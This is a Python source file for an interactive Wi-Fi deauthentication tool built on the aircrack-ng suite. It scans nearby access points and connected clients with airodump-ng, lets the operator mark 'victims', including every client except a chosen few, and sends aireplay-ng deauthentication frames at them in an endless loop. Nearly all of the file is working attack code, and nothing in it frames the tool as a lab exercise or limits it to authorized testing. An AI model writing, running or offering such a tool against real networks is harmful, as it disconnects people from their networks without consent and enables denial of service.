from subprocess import Popen,call,PIPE
import time
import os
from signal import SIGINT

DN = open(os.devnull,'w')

HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'

class process:
    @staticmethod
    def run(commands):
        process = Popen(commands,
                            stdout=PIPE, 
                            stderr=PIPE,
                            shell=True)
        stdout, stderr = process.communicate()
        res = [0,stderr.decode('utf-8','backslashreplace'),stdout.decode('utf-8','backslashreplace')]
        if len(stderr) != 0:
            res[0] = 0
        else:
            res[0] = 1
        return res

    @staticmethod
    def call(commands,sout,sin):
        call(commands,stdout=sout,stdin=sin)

class client:
    def __init__(self,NUM = 1,MAC='',POWER=0,BSSID=0):
        self.num = NUM
        self.mac = MAC
        self.power = POWER
        self.bssid = BSSID

class server:
    def __init__(self,NUM=1,ESSID=0,CH=0,ENCR=0,POWER=0,WPS='no',CLIENT=[],BSSID = 0):
        self.num = NUM
        self.essid = ESSID
        self.ch = CH
        self.encr = ENCR
        self.power = POWER
        self.wps = WPS
        self.clients = CLIENT
        self.bssid = BSSID

class victim:
    def __init__(self,BSSID=0,CHANNEL=0,ESSID='',CLIENT=[]):
        self.bssid = BSSID
        self.channel = CHANNEL
        self.client = CLIENT
        self.essid = ESSID

    def app_a_client(self,client_mac):
        has = False
        for c in self.client:
            if c is client_mac:
                has = True
        if not has:
            self.client.append(client_mac)

class mac:
    def __init__(self):
        self.mac_list = []

    def append(self,oui,company_name):
        self.mac_list.append((oui,company_name))
    '''
    get company tuple information
    returns a 2_tuple data, for example:
    ('70:B3:D5:A7:D', 'Prior Scientific Instruments Ltd')
    '''
    def get_mac_company(self,mac):
        res = ('','')
        for item in self.mac_list:
            if mac.startswith(item[0]) and len(item[0]) > len(res[0]):
                res = item
        return res
        

class CONFIG_CLASS:
    def __init__(self):
        self.wireless_card_name = ''
        self.airodump_file_prefix = 'a'
        self.aircarck_ng_command = 'aircrack-ng'
        self.iwconfig_command = 'iwconfig'
        self.airmon_ng_command = 'airmon-ng'
        self.airodump_ng_command = 'airodump-ng'
        self.aireplay_ng_command = 'aireplay-ng'
        self.deauthentication_times = '50'
        self.macaddress_file_name = 'macaddress.csv'
        self.mac = mac()

    def load_mac_address_into_memory(self):
        file = open(self.macaddress_file_name,'r',encoding='utf-8')
        file.readline() #skip first row line
        for line in file.readlines():
            items = line.find(',')
            if items != -1 and items!=(len(line)-1):
                key = line[0:items]
                vals = line[items+1:]
                vals = vals.replace('\n','')
                self.mac.append(key,vals)

class engine:
    def run(self,config):
        if not self.initial_check(config):
            return
        self.choose_wireless_card(config)
        self.set_chipset_in_monitor_mode(config)
        self.choose_wireless_card(config)
        victim_list = self.scan_networks(config)
        self.send_deauthentication_frames_on(config,victim_list)
        self.stop_monitor_mode(config)

    def scan_networks(self,config):
        victim_list = []
        self.get_victims(config,victim_list)
        '''
        for vic in victim_list:
            print(vic.bssid,vic.channel,vic.client)
        '''
        return victim_list

    def send_deauthentication_frames_on(self,config,victim_list):
        if len(victim_list) == 0:
            print(f'{WARNING} no victim selelcted {ENDC}')
            return
        self.order_all_victim_list_by_channel(victim_list)
        privous_channel = ''
        try:
            times = 0
            while True:
                times = times + 1
                for victim in victim_list:
                    if victim.channel != privous_channel:
                        privous_channel = victim.channel
                        self.set_channel_to(privous_channel,config)
                    commands = self.get_command(victim,config)
                    for command in commands:
                       start = time.time()
                       if len(command[1]) == 0:
                          print(f'sending {OKGREEN}%s{ENDC} deauthentication frames on {HEADER}%s{ENDC} {OKBLUE}%sth{ENDC} times'%(config.deauthentication_times,command[0],times),end=' ',flush=True)
                       else:
                          print(f'sending {OKGREEN}%s{ENDC} deauthentication frames on {HEADER}%s{ENDC} to {WARNING}%s{ENDC} {OKBLUE}%sth{ENDC} times'%(config.deauthentication_times,command[0],command[1],times),end=' ',flush=True)
                       self.turn_down_wifi_chip(config)
                       proc_deauth = Popen(command[2],stdout=DN,stderr=DN)
                       proc_deauth.wait()
                       print(f'costed {OKGREEN}%.2f{ENDC} seconds'%(time.time()-start))
        except KeyboardInterrupt:
            pass

    def get_command(self,victim,config):
        commands = []
        name = victim.essid
        if len(name) == 0:
            name = victim.bssid

        for mac in victim.client:
            commands.append((name,mac,['aireplay-ng','--deauth',config.deauthentication_times,'--ignore-negative-one','-a',victim.bssid,'-c',mac,config.wireless_card_name]))

        if len(commands) is 0:
            commands.append((name,'',['aireplay-ng','--deauth',config.deauthentication_times,'--ignore-negative-one','-a',victim.bssid,config.wireless_card_name]))
        return commands

    def turn_down_wifi_chip(self,config):
        process.call(['ifconfig',config.wireless_card_name,'down'],sout=DN,sin=DN)

    def set_channel_to(self,channel,config):
        process.call(['iwconfig',config.wireless_card_name,'channel',channel],sout=DN,sin=DN)

    def order_all_victim_list_by_channel(self,victim_list):
        for a in range(len(victim_list)):
            for b in range(len(victim_list)-1-a):
                if int(victim_list[b].channel) > int(victim_list[b+1].channel):#convert channel to int,and then compare
                    temp = victim_list[b+1]
                    victim_list[b+1] = victim_list[b]
                    victim_list[b] = temp

    def get_victims(self,config,victim_list):
        airdump_ng_all_command = ['airodump-ng',
                   '-a',  # only show associated clients
                   '--write-interval', '1', # Write every second
                   '-w', config.airodump_file_prefix, # output file
                   '--ignore-negative-one',
                   config.wireless_card_name]
        
        server_list = self.scan(config,airdump_ng_all_command,True)
        self.print_notice_on_server()
        target_list = []
        try:
            while True:
                print('you selected wap: ',HEADER,self.get_target_list_in_devices(target_list),ENDC)
                command = input(OKBLUE+"input your command : "+ENDC).strip()
                digits = self.parseCommand(command)
                if command.startswith('-1'):
                    target_list = digits[1:]
                elif command.startswith('-2'):
                    target_list = self.get_target_list_of_data_on_reverse(server_list,digits[1:])
                else:
                    target_server = self.get_server_on(server_list,digits[0])
                    if target_server is None:
                        print(FAIL+'WAP not found'+ENDC)
                        continue
                    self.scan_on_a_network(target_server,config,victim_list)
                    self.print_servers_list(server_list,config)
                    self.print_notice_on_server()


        except KeyboardInterrupt:
            pass

        self.add_on_victims(server_list,target_list,victim_list)

    def scan_on_a_network(self,target_server,config,victim_list):
        command = ['airodump-ng',
                   '-a',  # only show associated clients
                   '--write-interval', '1', # Write every second
                   '-w', config.airodump_file_prefix, # output file
                   '-d',target_server.bssid,
                   '-c',target_server.ch,
                   '--ignore-negative-one',
                   config.wireless_card_name]
        server_list = self.scan(config,command,is_server_side=False)
        if len(server_list) == 0:
            print(FAIL+"Don't found any devices"+ENDC)
            return
        client_list = server_list[0].clients
        self.print_notice_on_client()
        target_list = []
        try:
            while True:
                print('you selected devices on ',HEADER,target_server.essid,ENDC,' wap:',HEADER,self.get_target_list_in_devices(target_list),ENDC)
                command = input(OKBLUE+"input your command: "+ENDC).strip()
                digits = self.parseCommand(command)
                if command.startswith('-1'):
                    target_list = self.get_target_list_of_data_on_reverse(client_list,digits[1:])
                else:
                    target_list = digits
        except KeyboardInterrupt:
            pass
        self.add_on_victims_in_clients(client_list,target_list,victim_list,target_server.ch,target_server.essid)

    def print_notice_on_client(self):
        print(f"\n{OKGREEN}Choose Command: \n"+
            "     victims : Deauthenticating Clients that you choose \n"+
            "  -1 victims : Deauthenticating Clients that you don't choose \n"+
            "     ctr + c : save the selected victims,and go back to the previous step \n"
            "example:\n"+ 
            "        1-5 15 # attack 1 2 3 4 5 15 devices \n"+
            "        -1 1-4 30 # attack all devices except 1 2 3 4 30 \n"+
            "        ctr + c # save victims and go back\n\n",ENDC)

    def print_notice_on_server(self):
        print(f"\n{OKGREEN}Choose Command: \n"+
              "  -1 victims : Deauthenticating WAPs that you choose \n"+

              "  -2 victims : Deauthenticating WAPs that you don't choose \n"+
              "     ctr + c : save the selected victims,and starting an attack \n"+
              "Other Number : starting display all devices that with specified WAP \n\n"+
              "example:\n"+ 
              "        -1 1-5 15 # attack 1 2 3 4 5 15 devices \n"+
              "        -2 1-4 30 # attack all devices except 1 2 3 4 30 \n"+
              "        20 # display all devices connected to the 20th WPA \n"+
              "        ctr + c # save victims and go back\n\n",ENDC)


    def get_target_list_in_devices(self,target_list):
        res = ''
        for x in target_list:
            res = res + str(x) + ' '
        return res

    def scan(self,config,command,is_server_side=False):
        proc = Popen(command,stdout=DN,stderr=DN)
        result_list = []
        try:
            csv_file_name = config.airodump_file_prefix+"-01.csv"
            while(True):
                time.sleep(1)
                try:
                    if not os.path.exists(csv_file_name):
                        continue
                    result_list = self.parseCSV(csv_file_name)
                    if is_server_side:
                        self.print_servers_list(result_list,config)
                    else:
                        self.print_cliens_list(result_list[0].clients,config)#it work only for clients
                except Exception:
                    pass
        except KeyboardInterrupt:
            self.terminate_process(proc)
            self.remove_all_temp_file(config.airodump_file_prefix)
        return result_list

    def get_server_on(self,server_list,num):
        for server in server_list:
            if server.num == num:
                return server


    def get_target_list_of_data_on_reverse(self,server_list,digits):
        target_list = []
        for server in server_list:
            if server.num not in digits:
                target_list.append(server.num)
        return target_list

    def remove_all_temp_file(self,airodump_file_prefix):
        file_subfix = ['-01.cap','-01.csv','-01.kismet.csv','-01.kismet.netxml','-01.log.csv']
        for subfix in file_subfix:
            if os.path.exists(airodump_file_prefix+subfix):
                os.remove(airodump_file_prefix+subfix)

    def add_on_victims_in_clients(self,client_list,target_list,victim_list,ch,essid):
        count = 0 
        for client in client_list:
            if client.num in target_list:
                victim_res = self.get_victims_from_bssid(victim_list,client.bssid)
                if victim_res is not None:
                    if client.mac not in victim_res.client:
                        count = count + 1
                        victim_res.client.append(client.mac)
                else:
                    count = count + 1
                    victim_list.append(victim(BSSID=client.bssid,CHANNEL=ch,ESSID=essid,CLIENT=[client.mac]))
        alert = ''
        if count>1:
            alert = '\nadd on '+str(count)+' victims'
        elif count == 1:
            alert = '\nadd on 1 victim\n'
        if count > 0:
            print(OKGREEN,alert,ENDC)

    def get_victims_from_bssid(self,victim_list,bssid):
       for victim in victim_list:
           if bssid == victim.bssid:
               return victim

    def add_on_victims(self,server_list,target_list,victim_list):
        count = 0
        for server in server_list:
            if server.num in target_list:
                has = False
                for item in victim_list:
                    if item.bssid == server.bssid:
                        has = True
                        break
                if not has:
                    count = count + 1
                    victim_list.append(victim(BSSID=server.bssid,CHANNEL=server.ch,ESSID=server.essid,CLIENT=[]))
        alert = ''
        if count>1:
            alert = '\nadd on '+str(count)+' victims'
        elif count == 1:
            alert = '\nadd on 1 victim\n'
        if count > 0:
            print(OKGREEN,alert,ENDC)

    def parseCommand(self,command):
        digits = []
        for item in command.split(' '):
            if item.find('-') > 0:
                begin = int(item.split('-')[0])
                end = int(item.split('-')[1])
                for id in range(begin,end+1):
                    self.append_to_list_without_repeat(digits,id)
            else:
                self.append_to_list_without_repeat(digits,int(item))
        return digits

    def append_to_list_without_repeat(self,container,target):
        has = False
        for element in container:
            if element == target:
                has = True
                break
        if not has:
            container.append(target)

    def print_cliens_list(self,client_list,config):
        num_width = 6
        mac_width = 22
        power_width = 7
        bssid_width = 22
        productor_width = 22

        print('\n')
        for name,width in [("NUM",num_width),("MAC",mac_width),("PRODUCTOR",productor_width),("POWER",power_width),("BSSID",bssid_width),("PRODUCTOR",productor_width)]:
            print(HEADER+'{:<{width}}'.format(name,width=width),end=" ")
        else:
            print(ENDC)

        for width in [num_width,mac_width,productor_width,power_width,bssid_width,productor_width]:
            print('{:-<{width}}'.format('-',width=width),end=" ")
        else:
            print()
        
        for client in client_list:
            print("{:{width}}".format(client.num,width=num_width),end=' ')
            print("{:{width}}".format(client.mac,width=mac_width),end=' ')
            print("{:{width}}".format(getCompany(config,client.mac,productor_width),width=productor_width),end=' ')            
            print("{:{width}}".format(client.power,width=power_width),end=' ')
            print("{:{width}}".format(client.bssid,width=bssid_width),end=' ')
            print("{:{width}}".format(getCompany(config,client.bssid,productor_width),width=productor_width))

        print(f"\n {WARNING}input Control+C to interrupt{ENDC}\n")


    def print_servers_list(self,server_list,config):
        num_width = 6
        essid_width = 32
        ch_width = 5
        encr_width = 12
        power_width = 7
        wps_width = 5
        client_count_width = 8
        productor_width = 22
        print('\n')
        for name,width in [("NUM",num_width),("ESSID",essid_width),("CH",ch_width),("ENCR",encr_width),("POWER",power_width),("WPS",wps_width),("CLIENTS",client_count_width),("PRODUCTOR",productor_width)]:
            print(HEADER+'{:<{width}}'.format(name,width=width),end=" ")
        else:
            print(ENDC)

        for width in [num_width,essid_width,ch_width,encr_width,power_width,wps_width,client_count_width,productor_width]:
            print('{:-<{width}}'.format('-',width=width),end=" ")
        else:
            print()

        for server in server_list:
            print("{:{width}}".format(server.num,width=num_width),end=' ')

            essid = "{:{width}}".format(server.essid,width=essid_width)
            bts = bytes(essid,'utf-8')
            essid = str(bts[0:essid_width],encoding='utf-8',errors='backslashreplace')
            new_essid_width = len(essid) + int((essid_width - len(essid))/2)
            if new_essid_width!=0:
                essid = '{:{width}}'.format(str(essid),width=new_essid_width)
            print(essid,end=" ")
            print("{:{align}{width}}".format(server.ch,align='<',width=ch_width),end=' ')
            print('{:{align}{width}}'.format(server.encr,align='<',width=encr_width),end=' ')
            print('{:{align}{width}}'.format(server.power,align='^',width=power_width),end=' ')
            print('{:{align}{width}}'.format(server.wps,align='^',width=wps_width),end=' ')
            client_count = str(len(server.clients))
            if '0' == client_count:
                client_count == ''            
            print('{:{align}{width}}'.format(client_count,align='^',width=client_count_width),end=' ')
            print('{:{align}{width}}'.format(getCompany(config,server.bssid),align='<',width=client_count_width))
        
        print(f"\n {WARNING}input Control+C to interrupt{ENDC}\n")


    def get_a_server_from_server_list(self,server_list,bssid):
        for server in server_list:
            if server.bssid == bssid:
                return server

    def parseCSV(self,csvName):
        server_list = []
        is_server_side_started = False
        num = 0
        with open(csvName,'r',encoding='utf-8') as file:
            for line in file:
                line = line.strip()
                if len(line) == 0:
                    continue
                elif line.startswith('BSSID'):
                    is_server_side_started = True
                    num = 0
                    continue
                elif line.startswith('Station MAC'):
                    is_server_side_started = False
                    num = 0
                    continue
                if is_server_side_started:
                    items = line.split(',')
                    if len(items) < 14:
                        continue
                    essid = items[13].strip()
                    bssid = items[0].strip()
                    if len(essid) == 0:
                        essid = bssid
                    encr = items[5].strip()
                    ch = items[3].strip()
                    power = items[8].strip()
                    wps = 'no'
                    if 'WPA' in encr:
                        wps = 'yes'
                    num = num + 1
                    server_list.append(server(NUM=num,ESSID=essid,CH=ch,ENCR=encr,POWER=power,WPS=wps,BSSID=bssid,CLIENT=[]))
                else:
                    items = line.split(',')
                    if len(items) < 6:
                        continue
                    bssid = items[5].strip()
                    if '(not associated)' == bssid:
                        continue
                    sr = self.get_a_server_from_server_list(server_list,bssid)
                    if sr is None:
                        continue
                    mac = items[0].strip()
                    power = items[3].strip()
                    sr.clients.append(client(NUM=(len(sr.clients)+1),MAC=mac,POWER=power,BSSID=bssid))
        self.order_by_power_and_clients(server_list)
        return server_list
        

    def order_by_power_and_clients(self,server_list):
        '''
        for a in range(0,len(server_list)):
            for b in range(0,len(server_list)-a-1):
                if server_list[b].power > server_list[b+1].power:
                    self.swip(server_list,b,b+1)
        '''

        for a in range(0,len(server_list)):
            for b in range(0,len(server_list)-a-1):
                if len(server_list[b].clients) < len(server_list[b+1].clients):
                    self.swip(server_list,b,b+1)

        for server in server_list:
            for a in range(0,len(server.clients)):
                for b in range(0,len(server.clients)-a-1):
                    if server.clients[b].power > server.clients[b+1].power:
                        temp = server.clients[b]
                        server.clients[b] = server.clients[b+1]
                        server.clients[b+1] = temp

        

        for i,server in enumerate(server_list):
            server.num = i + 1
            for ci,client in enumerate(server.clients):
                client.num = ci + 1

    def swip(self,data,a,b):
        temp = data[a]
        data[a] = data[b]
        data[b] = temp

    def terminate_process(self,process):
        os.kill(process.pid,SIGINT)

    def initial_check(self,config):
        for name in [config.aircarck_ng_command,#aircrack-ng
                    config.airmon_ng_command,#airmon-ng
                    config.airodump_ng_command,#airodump-ng
                    config.aireplay_ng_command,#aireplay-ng
                    config.iwconfig_command]:#iwconfig
            res = process.run([name])
            if res[0] == 0 and len(res[2]) == 0 and len(res[1]) != 0:
                print(res[1])
                print(FAIL+"did you install the ",WARNING+""+name,FAIL+" package and had been add it into the PATH?"+ENDC)
                return False
        return True

    def show_iwconfig(self,config):
        res = process.run(config.iwconfig_command)
        if res[0] == 0 and len(res[2]) == 0 and len(res[1]) != 0:
            print("did you install the ",config.iwconfig_command," package and had been add it into the PATH?")
            return False
        print(res[1])
        print(res[2])
        return True        

    def choose_wireless_card(self,config):
        if self.show_iwconfig(config):
            while True:
                config.wireless_card_name = input(OKBLUE+"choose the wireless card name : "+ENDC)
                if len(config.wireless_card_name) == 0:
                    continue
                else:
                    break
            return True
        return False

    def set_chipset_in_monitor_mode(self,config):
        process.call(['airmon-ng','start',config.wireless_card_name],sout=DN,sin=DN)

    def stop_monitor_mode(self,config):
        process.call(['airmon-ng','stop',config.wireless_card_name],sout=DN,sin=DN)

def getConfig():
    config = CONFIG_CLASS() 
    config.load_mac_address_into_memory()
    return config

def getCompany(config,mac,max_width=50):
    res = config.mac.get_mac_company(mac)
    if len(res[1]) >= max_width:
        return res[1][0:max_width]
    return res[1]

if __name__ == '__main__':
    config = getConfig()
    engine().run(config)
    

